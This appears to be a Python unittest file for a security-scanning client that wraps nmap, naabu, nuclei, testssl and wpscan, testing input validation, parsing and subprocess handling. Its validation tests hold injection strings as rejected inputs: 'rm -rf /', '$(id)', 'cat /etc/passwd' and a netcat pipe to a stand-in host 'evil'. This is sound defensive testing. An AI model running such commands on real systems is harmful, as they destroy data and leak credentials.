import json
import os
import signal
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

from client import scope, tools

FIXTURES = os.path.join(os.path.dirname(__file__), 'fixtures')

# What host names resolve to in these tests: nothing here ever asks a real DNS server.
NAMES = {'www.example.test': ['93.184.215.14'], 'mail.example.test': ['93.184.215.20'],
         'dual.example.test': ['2606:4700::6810:1', '93.184.215.30', '93.184.215.31'], 'v6only.example.test': ['2606:4700::6810:2']}


def fake_getaddrinfo(name, port, *args, **kwargs):
    if name not in NAMES:
        raise OSError('no such host')
    return [(10 if ':' in a else 2, 1, 6, '', (a, 0)) for a in NAMES[name]]


def setUpModule():
    """No test here resolves a name for real, looks up this machine's own addresses, or depends on this machine's network setting."""
    for patcher in (mock.patch('socket.getaddrinfo', side_effect=fake_getaddrinfo),
                    mock.patch.object(scope, 'own_addresses', return_value=frozenset({'172.19.0.2'})),
                    mock.patch.object(scope, 'internal_allowed', return_value=False)):
        patcher.start()
        unittest.addModuleCleanup(patcher.stop)


def _read(name):
    with open(os.path.join(FIXTURES, name), encoding='utf-8') as handle:
        return handle.read()


class ValidateTargetsTests(unittest.TestCase):
    """The one gate every target list passes through before it ever reaches subprocess: a compromised or buggy server
    naming something other than a plain address, host name or host:port must never reach an argv list."""

    def test_accepts_plain_ips_and_hostnames(self):
        out = tools.validate_targets(['8.8.8.8', '2606:4700:4700::1111', 'www.example.test', 'WWW.Example.test.'])
        self.assertEqual(out, ['8.8.8.8', '2606:4700:4700::1111', 'www.example.test'])

    def test_host_port_and_urls_only_for_the_endpoint_form(self):
        values = ['https://www.example.test/admin', 'www.example.test:8443', '[2606:4700:4700::1111]:443', '8.8.8.8:0080', '1.1.1.1']
        self.assertEqual(tools.validate_targets(values, endpoint=True),
                         ['https://www.example.test/admin', 'www.example.test:8443', '[2606:4700:4700::1111]:443', '8.8.8.8:80', '1.1.1.1'])
        for value in values[:4]:
            with self.subTest(value=value), self.assertRaises(tools.TargetError):
                tools.validate_targets([value])

    def test_a_bad_port_or_scheme_is_refused_for_the_endpoint_form(self):
        for bad in ('www.example.test:0', 'www.example.test:65536', 'www.example.test:abc', 'www.example.test:', ':443', '[::1]:443',
                    '[2606:4700:4700::1111]:99999', 'ftp://8.8.8.8/', 'http://user:pw@www.example.test/', 'http://127.0.0.1/'):
            with self.subTest(bad=bad), self.assertRaises(tools.TargetError):
                tools.validate_targets([bad], endpoint=True)

    def test_rejects_shell_metacharacters(self):
        for bad in ('8.8.8.8; rm -rf /', '`whoami`', '$(id)', '8.8.8.8 && cat /etc/passwd', '8.8.8.8|nc evil 4444',
                    "8.8.8.8'", '8.8.8.8"', 'target\nwith\nnewlines', 'www.example.test\x00'):
            for endpoint in (False, True):
                with self.subTest(bad=bad, endpoint=endpoint), self.assertRaises(tools.TargetError):
                    tools.validate_targets([bad], endpoint=endpoint)

    def test_rejects_urls_and_schemes(self):
        for bad in ('http://8.8.8.8/', 'https://example.test/admin', 'file:///etc/passwd'):
            with self.assertRaises(tools.TargetError, msg=bad):
                tools.validate_targets([bad])

    def test_rejects_not_a_list_or_an_empty_list(self):
        for bad in (None, 'a-single-string', [], {}, 42):
            with self.assertRaises(tools.TargetError):
                tools.validate_targets(bad)

    def test_rejects_an_overlong_or_non_string_entry(self):
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(['x' * 300])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([12345])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([None])

    def test_more_than_the_limit_is_refused_never_truncated(self):
        many = [f'8.8.{i // 256}.{i % 256}' for i in range(200)]
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(many, limit=10)
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(many[:tools.MAX_TARGETS + 1])
        self.assertEqual(len(tools.validate_targets(many[:tools.MAX_TARGETS])), tools.MAX_TARGETS)

    def test_a_bad_entry_after_the_first_ones_is_still_caught(self):
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(['8.8.8.8'] * 9 + ['127.0.0.1'], limit=10)

    def test_duplicates_are_dropped_in_order(self):
        self.assertEqual(tools.validate_targets(['1.1.1.1', '8.8.8.8', '1.1.1.1', 'www.example.test', 'WWW.EXAMPLE.TEST']),
                         ['1.1.1.1', '8.8.8.8', 'www.example.test'])

    def test_a_name_that_does_not_resolve_is_allowed(self):
        self.assertEqual(tools.validate_targets(['nowhere.example.test']), ['nowhere.example.test'])


class NmapParsingTests(unittest.TestCase):
    def test_parses_the_sample_xml_into_the_typed_shape(self):
        result = tools.parse_nmap_xml(_read('sample_nmap.xml'))
        self.assertEqual(len(result['hosts']), 2)
        first = result['hosts'][0]
        self.assertEqual(first['ip'], '192.0.2.10')
        self.assertEqual(first['os_guess'], 'Linux 5.X')
        # Only the open port is kept (closed 9999 is dropped), in document order.
        self.assertEqual(len(first['ports']), 2)
        self.assertEqual(first['ports'][0], {'number': 22, 'protocol': 'tcp', 'state': 'open', 'service_name': 'ssh',
                                             'product': 'OpenSSH', 'version': '8.9'})
        self.assertEqual(first['ports'][1]['number'], 80)
        self.assertEqual(first['ports'][1]['product'], 'nginx')
        second = result['hosts'][1]
        self.assertEqual(second['ip'], '198.51.100.20')
        self.assertEqual(second['os_guess'], '')  # no <os> block for this host

    def test_empty_or_malformed_xml_yields_no_hosts_not_a_crash(self):
        self.assertEqual(tools.parse_nmap_xml(''), {'hosts': []})
        self.assertEqual(tools.parse_nmap_xml('not xml at all'), {'hosts': []})


class NaabuParsingTests(unittest.TestCase):
    def test_parses_the_sample_output_into_the_typed_shape(self):
        result = tools.parse_naabu_output(_read('sample_naabu.jsonl'))
        self.assertEqual(result, {'192.0.2.10': [22, 80], '198.51.100.20': [443], '203.0.113.5': [8080]})

    def test_non_json_lines_are_skipped_not_fatal(self):
        text = 'garbage\n{"ip": "192.0.2.1", "port": 80}\nmore garbage {{{\n'
        self.assertEqual(tools.parse_naabu_output(text), {'192.0.2.1': [80]})

    def test_a_tarpit_address_over_the_cap_is_dropped(self):
        lines = '\n'.join(f'{{"ip": "192.0.2.99", "port": {p}}}' for p in range(1, tools.MAX_OPEN_PER_IP + 10))
        self.assertEqual(tools.parse_naabu_output(lines), {})


class NucleiParsingTests(unittest.TestCase):
    def test_parses_the_sample_jsonl_carrying_matcher_name_through(self):
        findings = tools.parse_nuclei_jsonl(_read('sample_nuclei.jsonl'))
        self.assertEqual(len(findings), 2)
        tech = findings[0]
        self.assertEqual(tech['template_id'], 'tech-detect')
        self.assertEqual(tech['matcher_name'], 'jquery')  # the field this phase adds end to end
        self.assertEqual(tech['host'], 'www.example.test')
        panel = findings[1]
        self.assertEqual(panel['template_id'], 'exposed-panel')
        self.assertEqual(panel['matcher_name'], 'admin-panel')
        self.assertEqual(panel['severity'], 'high')
        self.assertEqual(panel['extracted_results'], ['panel'])
        self.assertEqual(panel['tags'], ['panel', 'exposure'])

    def test_host_of_matches_cveFeed_nuclei_scan_host_of_shape(self):
        self.assertEqual(tools.host_of({'host': 'https://www.example.test/admin'}), 'www.example.test')
        self.assertEqual(tools.host_of({'host': 'www.example.test:8443'}), 'www.example.test')
        self.assertEqual(tools.host_of({'host': 'www.example.test'}), 'www.example.test')

    def test_malformed_lines_are_skipped_or_coerced_never_fatal(self):
        lines = ['[1, 2]', '"a string"', '42', 'null', 'x' * 1_000_000, '{"broken": ',
                 json.dumps({'template-id': 'a', 'info': 'not an object'}),
                 json.dumps({'template-id': 7, 'host': 7, 'ip': '8.8.8.8', 'matched-at': ['x'], 'matcher-name': None,
                             'extracted-results': 'one value', 'info': {'name': 5, 'severity': ['high'], 'tags': 'cve,rce, ,x'}}),
                 json.dumps({'template-id': 'b', 'host': 'http://[::1', 'extracted-results': {'a': 1}, 'info': {'tags': 9}}),
                 json.dumps({'template-id': 'c', 'host': {'nested': True}, 'extracted-results': ['ok', 3, None, ''],
                             'info': {'tags': ['t', 1, None]}})]
        findings = tools.parse_nuclei_jsonl('\n'.join(lines))
        self.assertEqual([f['template_id'] for f in findings], ['a', '', 'b', 'c'])
        self.assertEqual(findings[0]['name'], '')
        self.assertEqual(findings[0]['severity'], 'unknown')
        second = findings[1]
        self.assertEqual((second['host'], second['matched_at'], second['matcher_name'], second['name'], second['severity']),
                         ('8.8.8.8', '', '', '', 'unknown'))
        self.assertEqual(second['extracted_results'], ['one value'])
        self.assertEqual(second['tags'], ['cve', 'rce', 'x'])
        self.assertEqual((findings[2]['host'], findings[2]['extracted_results'], findings[2]['tags']), ('', [], []))
        self.assertEqual((findings[3]['host'], findings[3]['extracted_results'], findings[3]['tags']), ('', ['ok'], ['t']))

    def test_the_number_of_findings_is_capped(self):
        small = {'template-id': 't', 'host': 'www.example.test', 'info': {'name': 'n', 'severity': 'low'}}
        findings = tools.parse_nuclei_jsonl('\n'.join([json.dumps(small)] * (tools.MAX_FINDINGS + 5)))
        self.assertEqual(len(findings), tools.MAX_FINDINGS)

    def test_findings_and_their_fields_are_capped(self):
        row = {'template-id': 't' * 1000, 'host': 'www.example.test', 'matched-at': 'm' * 5000, 'matcher-name': 'n' * 1000,
               'extracted-results': ['e' * 1000] * 50,
               'info': {'name': 'x' * 5000, 'severity': 's' * 100, 'description': 'd' * 10000, 'tags': [f'tag{i}' for i in range(50)]}}
        findings = tools.parse_nuclei_jsonl('\n'.join([json.dumps(row)] * 3))
        first = findings[0]
        self.assertEqual(len(first['description']), 4000)
        self.assertEqual(len(first['matched_at']), 500)
        self.assertEqual(len(first['name']), 500)
        self.assertEqual(len(first['template_id']), 200)
        self.assertEqual(len(first['severity']), 20)
        self.assertEqual(len(first['tags']), 20)
        self.assertEqual(len(first['extracted_results']), 20)
        self.assertEqual({len(e) for e in first['extracted_results']}, {500})


class RunnerArgvTests(unittest.TestCase):
    """The argv passed to subprocess is always a fixed list of flags plus the validated target list (never a string,
    never shell=True), and the target file is written, not interpolated into the command."""

    def test_run_nmap_builds_a_fixed_argv_and_parses_its_stdout(self):
        captured = {}

        def fake_run(argv, timeout, register=None):
            captured['argv'], captured['timeout'] = argv, timeout
            self.assertIsInstance(argv, list)
            with open(argv[argv.index('-iL') + 1], encoding='utf-8') as handle:
                captured['targets_file_contents'] = handle.read()
            return _read('sample_nmap.xml')
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_nmap(['8.8.8.8', '1.1.1.1'])
        self.assertEqual(captured['argv'][0], tools.NMAP_BIN)
        self.assertIn('-oX', captured['argv'])
        self.assertIn('-n', captured['argv'])  # no reverse DNS: parse_nmap_xml never reads host names
        self.assertEqual(captured['targets_file_contents'], '8.8.8.8\n1.1.1.1\n')
        self.assertEqual(captured['timeout'], tools.NMAP_MIN_TIMEOUT)
        self.assertEqual(len(result['hosts']), 2)

    def test_nmap_and_naabu_are_given_the_address_a_name_was_judged_by(self):
        files = []

        def fake_run(argv, timeout, register=None):
            path = argv[argv.index('-iL') + 1] if '-iL' in argv else argv[argv.index('-list') + 1]
            with open(path, encoding='utf-8') as handle:
                files.append(handle.read())
            return ''
        with mock.patch('client.tools._run', side_effect=fake_run):
            tools.run_nmap(['www.example.test', 'dual.example.test', 'v6only.example.test', 'nowhere.example.test', '93.184.215.14'])
            tools.run_naabu(['www.example.test', 'dual.example.test'])
        # The first IPv4 address of each name (what nmap and naabu pick themselves); a name with none, or that does not resolve, is dropped.
        self.assertEqual(files, ['93.184.215.14\n93.184.215.30\n', '93.184.215.14\n93.184.215.30\n'])

    def test_nothing_runs_when_no_name_resolves(self):
        with mock.patch('client.tools._run') as fake_run:
            self.assertEqual(tools.run_nmap(['nowhere.example.test']), {'hosts': []})
            self.assertEqual(tools.run_naabu(['nowhere.example.test']), {'ports': {}})
        fake_run.assert_not_called()

    def test_the_nmap_timeout_grows_with_the_host_count(self):
        self.assertEqual(tools.nmap_timeout(1), 600)
        self.assertEqual(tools.nmap_timeout(10), 900)
        self.assertEqual(tools.nmap_timeout(64), 3600)
        with mock.patch('client.tools._run', return_value='') as fake_run:
            tools.run_nmap([f'8.8.8.{i}' for i in range(1, 21)])
            self.assertEqual(fake_run.call_args[0][1], 1800)
            tools.run_nmap(['8.8.8.8'], timeout=42)
            self.assertEqual(fake_run.call_args[0][1], 42)

    def test_an_ipv6_address_runs_nmap_with_dash_6_on_its_own_and_the_hosts_come_back_together(self):
        runs = []

        def fake_run(argv, timeout, register=None):
            with open(argv[argv.index('-iL') + 1], encoding='utf-8') as handle:
                runs.append((argv, handle.read()))
            return _read('sample_nmap.xml') if len(runs) == 1 else '<nmaprun/>'
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_nmap(['8.8.8.8', '2606:4700:4700::1111'])
        self.assertEqual(len(runs), 2)
        self.assertNotIn('-6', runs[0][0])
        self.assertEqual(runs[0][1], '8.8.8.8\n')
        self.assertEqual(runs[1][0][:3], [tools.NMAP_BIN, '-6', *tools.NMAP_FLAGS[:1]])
        self.assertEqual(runs[1][1], '2606:4700:4700::1111\n')
        self.assertEqual(len(result['hosts']), 2)  # the sample report's two hosts, from the IPv4 run
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as only_v6:
            tools.run_nmap(['2606:4700:4700::1111'])
        self.assertEqual(only_v6.call_count, 1)
        self.assertEqual(only_v6.call_args[0][0][1], '-6')

    def test_run_naabu_builds_a_fixed_argv_and_parses_its_stdout(self):
        with mock.patch('client.tools._run', return_value=_read('sample_naabu.jsonl')) as fake_run:
            result = tools.run_naabu(['8.8.8.8'])
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NAABU_BIN)
        self.assertIn('-json', argv)
        self.assertEqual(result['ports']['192.0.2.10'], [22, 80])  # whatever naabu printed is parsed as it is

    def test_run_nuclei_adds_clean_tags_and_severities_only(self):
        with mock.patch('client.tools._run', return_value=_read('sample_nuclei.jsonl')) as fake_run:
            result = tools.run_nuclei(['www.example.test'], tags=['tech', 'not valid; rm -rf /'],
                                      severities=['high', 'not-a-severity'])
        argv = fake_run.call_args[0][0]
        self.assertIn('-tags', argv)
        self.assertEqual(argv[argv.index('-tags') + 1], 'tech')  # the shell-unsafe tag was dropped, not passed through
        self.assertIn('-severity', argv)
        self.assertEqual(argv[argv.index('-severity') + 1], 'high')
        self.assertEqual(len(result['findings']), 2)

    def test_nuclei_always_excludes_dos_templates_and_omits_raw_traffic(self):
        for tags in (None, [], ['cve'], ['dos', 'cve']):
            with self.subTest(tags=tags), mock.patch('client.tools._run', return_value='') as fake_run:
                tools.run_nuclei(['www.example.test'], tags=tags)
                argv = fake_run.call_args[0][0]
                self.assertEqual(argv[argv.index('-etags') + 1], 'dos')
                self.assertIn('-omit-raw', argv)
                self.assertEqual('-tags' in argv, bool(tags))

    def test_a_tag_filter_with_nothing_usable_fails_closed(self):
        for tags in (['not valid; rm -rf /'], ['CVE'], ['cve\n'], 'cve', [42]):
            with self.subTest(tags=tags), mock.patch('client.tools._run') as fake_run:
                with self.assertRaises(tools.TargetError):
                    tools.run_nuclei(['www.example.test'], tags=tags)
                fake_run.assert_not_called()

    def test_a_trailing_newline_is_not_a_valid_tag_or_severity(self):
        self.assertEqual(tools._clean_words(['cve\n', 'rce'], tools._TAG), ['rce'])
        self.assertEqual(tools._clean_words(['high\n', 'low'], tools._SEVERITY), ['low'])
        self.assertEqual(tools._clean_words('high', tools._SEVERITY), [])

    def test_nuclei_keeps_names_and_takes_urls_and_host_port(self):
        with mock.patch('client.tools._run', return_value='') as fake_run:
            def capture(argv, timeout, register=None):
                with open(argv[argv.index('-l') + 1], encoding='utf-8') as handle:
                    capture.text = handle.read()
                return ''
            fake_run.side_effect = capture
            tools.run_nuclei(['https://www.example.test/', 'www.example.test:8443', '[2606:4700:4700::1111]:443'])
        self.assertEqual(capture.text, 'https://www.example.test/\nwww.example.test:8443\n[2606:4700:4700::1111]:443\n')

    def test_a_malicious_target_never_reaches_subprocess(self):
        with mock.patch('client.tools._run') as fake_run:
            with self.assertRaises(tools.TargetError):
                tools.run_nmap(['8.8.8.8; rm -rf /'])
        fake_run.assert_not_called()


class RunTests(unittest.TestCase):
    """``_run`` itself, with real (harmless) child processes: bounded output, the whole process group killed on timeout."""

    def test_returns_stdout_and_registers_a_handle_the_daemon_can_poll_and_kill(self):
        handles = []
        out = tools._run([sys.executable, '-c', 'print("hello")'], 30, register=handles.append)
        self.assertEqual(out, 'hello\n')
        self.assertEqual(len(handles), 1)
        self.assertEqual(handles[0].poll(), 0)
        self.assertTrue(callable(handles[0].kill))

    def test_output_past_the_cap_stops_the_run_with_a_clear_error(self):
        script = 'import sys, time; sys.stdout.write("x" * 100000); sys.stdout.flush(); time.sleep(30)'
        started = time.monotonic()
        with self.assertRaises(tools.ToolOutputError):
            tools._run([sys.executable, '-c', script], 30, max_bytes=1000)
        self.assertLess(time.monotonic() - started, 15)

    def test_the_default_cap_applies_to_nmap_xml_and_udp_raw_xml(self):
        with tempfile.TemporaryDirectory() as work:
            fake_nmap = os.path.join(work, 'nmap')
            with open(fake_nmap, 'w', encoding='utf-8') as handle:
                handle.write(f'#!{sys.executable}\nimport sys\nsys.stdout.write("<" * 5000)\n')
            os.chmod(fake_nmap, 0o755)
            with mock.patch.object(tools, 'NMAP_BIN', fake_nmap), mock.patch.object(tools, 'MAX_TOOL_OUTPUT', 1000):
                with self.assertRaises(tools.ToolOutputError):
                    tools.run_nmap_udp('8.8.8.8')
                with self.assertRaises(tools.ToolOutputError):
                    tools.run_nmap(['8.8.8.8'])

    def test_a_timeout_kills_the_whole_process_group_and_raises(self):
        with tempfile.TemporaryDirectory() as work:
            pid_file = os.path.join(work, 'child.pid')
            script = ('import subprocess, sys, time\n'
                      f'child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])\n'
                      f'open({pid_file!r}, "w").write(str(child.pid))\n'
                      'time.sleep(60)\n')
            with mock.patch('client.tools.os.killpg', wraps=os.killpg) as killpg:
                with self.assertRaises(subprocess.TimeoutExpired):
                    tools._run([sys.executable, '-c', script], 2)
            self.assertEqual(killpg.call_args[0][1], signal.SIGKILL)
            with open(pid_file, encoding='utf-8') as handle:
                grandchild = int(handle.read())
        self.assertTrue(_gone(grandchild), 'the tool\'s own child was left running')

    def test_the_handle_kills_the_group_and_falls_back_to_the_process(self):
        proc = mock.Mock(pid=4321)
        with mock.patch('client.tools.os.killpg') as killpg:
            tools._ProcessGroup(proc).kill()
        killpg.assert_called_once_with(4321, signal.SIGKILL)
        proc.kill.assert_not_called()
        with mock.patch('client.tools.os.killpg', side_effect=ProcessLookupError):
            tools._ProcessGroup(proc).kill()
        proc.kill.assert_called_once_with()

    def test_every_tool_starts_in_its_own_session(self):
        with mock.patch('client.tools.subprocess.Popen', side_effect=OSError('stop here')) as popen:
            with self.assertRaises(OSError):
                tools._run(['true'], 5)
        self.assertTrue(popen.call_args[1]['start_new_session'])


def _gone(pid, wait=5.0):
    """Whether ``pid`` has exited (a zombie waiting for its reaper counts as gone)."""
    deadline = time.monotonic() + wait
    while time.monotonic() < deadline:
        try:
            with open(f'/proc/{pid}/stat', encoding='utf-8') as handle:
                if handle.read().rsplit(')', 1)[1].split()[0] == 'Z':
                    return True
        except FileNotFoundError:
            return True
        time.sleep(0.05)
    return False


class TestsslRunnerTests(unittest.TestCase):
    """The argv passed to subprocess.Popen is always a fixed list of flags plus the server-vetted host:ip:port
    (never a string, never shell=True) and only the four fields evaluate() reads ever leave this process."""

    class _FakeProc:
        pid = 98765

        def __init__(self, argv, report, **kwargs):
            self.argv = argv
            self.kwargs = kwargs
            self.returncode = 0
            out = argv[argv.index('--jsonfile') + 1]
            with open(out, 'w', encoding='utf-8') as handle:
                json.dump(report, handle)

        def communicate(self, timeout=None):
            return ('', '')

    def test_an_oversized_or_unreadable_report_is_a_failed_run_not_no_findings(self):
        with mock.patch('client.tools.MAX_TESTSSL_OUTPUT', 10), \
                mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: self._FakeProc(argv, [{'id': 'x' * 50, 'severity': 'LOW'}], **kw)):
            with self.assertRaises(tools.ToolOutputError):
                tools.run_testssl('www.example.test', '8.8.8.8', 443)

        class NoReport(self._FakeProc):
            def __init__(self, argv, report, **kwargs):
                self.argv, self.kwargs = argv, kwargs  # writes no report file at all
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: NoReport(argv, [], **kw)):
            with self.assertRaises(tools.ToolOutputError):
                tools.run_testssl('www.example.test', '8.8.8.8', 443)

    def test_builds_a_fixed_argv_and_reads_only_the_four_fields(self):
        report = [{'id': 'heartbleed', 'severity': 'HIGH', 'finding': 'VULNERABLE', 'cve': 'CVE-2014-0160', 'extra': 'dropped'},
                  {'id': 'not_tracked', 'severity': 'INFO', 'finding': 'test ok'}]
        captured = {}

        def fake_popen(argv, **kwargs):
            proc = self._FakeProc(argv, report, **kwargs)
            captured['argv'], captured['kwargs'] = proc.argv, kwargs
            return proc
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_testssl('www.example.test', '8.8.8.8', 443)
        self.assertEqual(captured['argv'][0], tools.TESTSSL_BIN)
        self.assertIn('--ip', captured['argv'])
        self.assertEqual(captured['argv'][-1], 'www.example.test:443')
        self.assertTrue(captured['kwargs']['start_new_session'])
        self.assertEqual(result, {'items': [
            {'id': 'heartbleed', 'severity': 'HIGH', 'finding': 'VULNERABLE', 'cve': 'CVE-2014-0160'},
            {'id': 'not_tracked', 'severity': 'INFO', 'finding': 'test ok', 'cve': ''}]})

    def test_starttls_is_added_only_when_given(self):
        captured = {}

        def fake_popen(argv, **kwargs):
            captured['argv'] = argv
            return self._FakeProc(argv, [])
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            tools.run_testssl('mail.example.test', '8.8.4.4', 25, starttls='smtp')
        self.assertIn('--starttls', captured['argv'])
        self.assertEqual(captured['argv'][captured['argv'].index('--starttls') + 1], 'smtp')
        with mock.patch('client.tools.subprocess.Popen') as popen:
            for bad in ('smtp; id', 'SMTP\n', 7):
                with self.subTest(bad=bad), self.assertRaises(tools.TargetError):
                    tools.run_testssl('mail.example.test', '8.8.4.4', 25, starttls=bad)
        popen.assert_not_called()

    def test_an_ipv6_host_is_bracketed(self):
        captured = {}

        def fake_popen(argv, **kwargs):
            captured['argv'] = argv
            return self._FakeProc(argv, [])
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            tools.run_testssl('2606:4700:4700::1111', '2606:4700:4700::1111', 443)
        self.assertEqual(captured['argv'][-1], '[2606:4700:4700::1111]:443')

    def test_a_malicious_host_never_reaches_subprocess(self):
        with mock.patch('client.tools.subprocess.Popen') as popen:
            with self.assertRaises(tools.TargetError):
                tools.run_testssl('host; rm -rf /', '8.8.8.8', 443)
            with self.assertRaises(tools.TargetError):
                tools.run_testssl('www.example.test', 'www.example.test', 443)  # the ip must be one plain address
        popen.assert_not_called()

    def test_a_timeout_kills_the_group_and_raises_instead_of_reporting_no_issues(self):
        class Slow(self._FakeProc):
            calls = 0

            def communicate(self, timeout=None):
                Slow.calls += 1
                if Slow.calls == 1:
                    raise subprocess.TimeoutExpired('testssl.sh', timeout)
                return ('', '')
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: Slow(argv, [])), \
                mock.patch('client.tools.os.killpg') as killpg:
            with self.assertRaises(subprocess.TimeoutExpired):
                tools.run_testssl('www.example.test', '8.8.8.8', 443, timeout=1)
        killpg.assert_called_once_with(Slow.pid, signal.SIGKILL)


class UdpRunnerTests(unittest.TestCase):
    def test_builds_a_fixed_argv_with_the_curated_ports_and_returns_raw_xml(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            result = tools.run_nmap_udp('8.8.8.8')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NMAP_BIN)
        self.assertIn('-sU', argv)
        self.assertIn('8.8.8.8', argv)
        self.assertEqual(fake_run.call_args[0][1], 1500)
        self.assertEqual(result, {'xml': '<nmaprun/>'})

    def test_an_ipv6_address_is_scanned_with_dash_6(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            tools.run_nmap_udp('2606:4700:20::681a:907')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[:3], [tools.NMAP_BIN, '-6', '-sU'])
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as v4:
            tools.run_nmap_udp('8.8.8.8')
        self.assertNotIn('-6', v4.call_args[0][0])

    def test_a_name_stays_a_name_in_the_raw_report(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            tools.run_nmap_udp('www.example.test')
        self.assertEqual(fake_run.call_args[0][0][-1], 'www.example.test')

    def test_a_malicious_address_never_reaches_subprocess(self):
        with mock.patch('client.tools._run') as fake_run:
            with self.assertRaises(tools.TargetError):
                tools.run_nmap_udp('8.8.8.8; rm -rf /')
        fake_run.assert_not_called()


class WpscanRunnerTests(unittest.TestCase):
    class _FakeProc:
        pid = 55555

        def __init__(self, argv, env, report, returncode=0, stderr='', stdout=''):
            self.argv, self.env = argv, env
            self.returncode = returncode
            self._stderr = stderr
            self._stdout = stdout
            if report is not None:
                out = argv[argv.index('-o') + 1]
                with open(out, 'w', encoding='utf-8') as handle:
                    json.dump(report, handle)

        def communicate(self, timeout=None):
            return (self._stdout, self._stderr)

    def test_builds_argv_reads_the_report_and_puts_the_token_only_in_the_environment(self):
        report = {'version': {'number': '6.4'}}
        captured = {}

        def fake_popen(argv, env=None, **kwargs):
            proc = self._FakeProc(argv, env, report)
            captured['argv'], captured['env'], captured['kwargs'] = argv, env, kwargs
            return proc
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_wpscan('https://www.example.test', token='super-secret-token')
        self.assertEqual(captured['argv'][0], tools.WPSCAN_BIN)
        self.assertIn('--url', captured['argv'])
        self.assertNotIn('super-secret-token', captured['argv'])
        self.assertEqual(captured['env'].get('WPSCAN_API_TOKEN'), 'super-secret-token')
        self.assertTrue(captured['kwargs']['start_new_session'])
        self.assertEqual(result, {'report': report, 'returncode': 0, 'stderr_tail': ''})

    def test_no_report_written_is_reported_as_none_not_a_crash(self):
        def fake_popen(argv, env=None, **kwargs):
            return self._FakeProc(argv, env, None, returncode=4, stderr='Scan Aborted: not running WordPress\n')
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_wpscan('https://www.example.test')
        self.assertIsNone(result['report'])
        self.assertEqual(result['returncode'], 4)
        self.assertEqual(result['stderr_tail'], 'Scan Aborted: not running WordPress')

    def test_the_throttle_is_above_zero(self):
        # WPScan refuses --throttle 0 ("--throttle 0 is not > 0") and aborts before scanning
        self.assertGreater(int(tools.WPSCAN_ARGS[tools.WPSCAN_ARGS.index('--throttle') + 1]), 0)

    def _run_fake(self, token='', **fake):
        report = fake.pop('report', None)
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, env=None, **kw: self._FakeProc(argv, env, report, **fake)):
            return tools.run_wpscan('https://www.example.test', token=token)

    def test_a_failure_wpscan_prints_on_stdout_is_reported_when_stderr_is_empty(self):
        result = self._run_fake(returncode=1, stdout='[i] starting\nScan Aborted: invalid option: --x\n')
        self.assertEqual(result['stderr_tail'], 'Scan Aborted: invalid option: --x')

    def test_stderr_wins_over_stdout(self):
        result = self._run_fake(returncode=1, stdout='Scan Aborted: from stdout\n', stderr='boom from stderr\n\n')
        self.assertEqual(result['stderr_tail'], 'boom from stderr')

    def test_a_vulnerable_exit_code_keeps_the_report_and_returncode(self):
        report = {'version': {'number': '6.4'}}
        result = self._run_fake(returncode=4, report=report, stdout='lots of output\n')
        self.assertEqual(result['report'], report)
        self.assertEqual(result['returncode'], 4)

    def test_the_token_and_long_lines_never_come_back(self):
        result = self._run_fake(token='tok-123', returncode=1, stdout='Scan Aborted: bad token tok-123 ' + 'x' * 500 + '\n')
        self.assertNotIn('tok-123', result['stderr_tail'])
        self.assertIn('***', result['stderr_tail'])
        self.assertLessEqual(len(result['stderr_tail']), 300)

    def test_a_timeout_kills_the_whole_group(self):
        class Slow(self._FakeProc):
            calls = 0

            def communicate(self, timeout=None):
                Slow.calls += 1
                if Slow.calls == 1:
                    raise subprocess.TimeoutExpired('wpscan', timeout)
                self.returncode = -9
                return ('', 'killed\n')
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, env=None, **kw: Slow(argv, env, None)), \
                mock.patch('client.tools.os.killpg') as killpg:
            result = tools.run_wpscan('https://www.example.test', timeout=60)
        killpg.assert_called_once_with(Slow.pid, signal.SIGKILL)
        self.assertEqual(result['returncode'], -9)

    def test_rejects_a_non_url(self):
        with mock.patch('client.tools.subprocess.Popen') as popen:
            with self.assertRaises(tools.TargetError):
                tools.run_wpscan('not-a-url; rm -rf /')
        popen.assert_not_called()


class DetectToolsTests(unittest.TestCase):
    def test_a_missing_binary_is_left_out_not_fatal(self):
        with mock.patch('client.tools.subprocess.run', side_effect=FileNotFoundError), \
                mock.patch('client.tools.gvm_available', return_value=False):
            self.assertEqual(tools.detect_tools(), [])

    def test_an_installed_binary_is_reported(self):
        with mock.patch('client.tools.subprocess.run', return_value=mock.Mock(returncode=0)), \
                mock.patch('client.tools.gvm_available', return_value=False):
            self.assertEqual(sorted(tools.detect_tools()), ['naabu', 'nmap', 'nuclei', 'testssl', 'wpscan'])

    def test_gvm_is_reported_once_the_sentinels_own_gvmd_is_reachable(self):
        with mock.patch('client.tools.subprocess.run', side_effect=FileNotFoundError), \
                mock.patch('client.tools.gvm_available', return_value=True):
            self.assertEqual(tools.detect_tools(), ['gvm'])


class GvmAvailableTests(unittest.TestCase):
    def test_false_without_the_python_gvm_package(self):
        with mock.patch.dict('sys.modules', {'gvm': None}):
            self.assertFalse(tools.gvm_available())

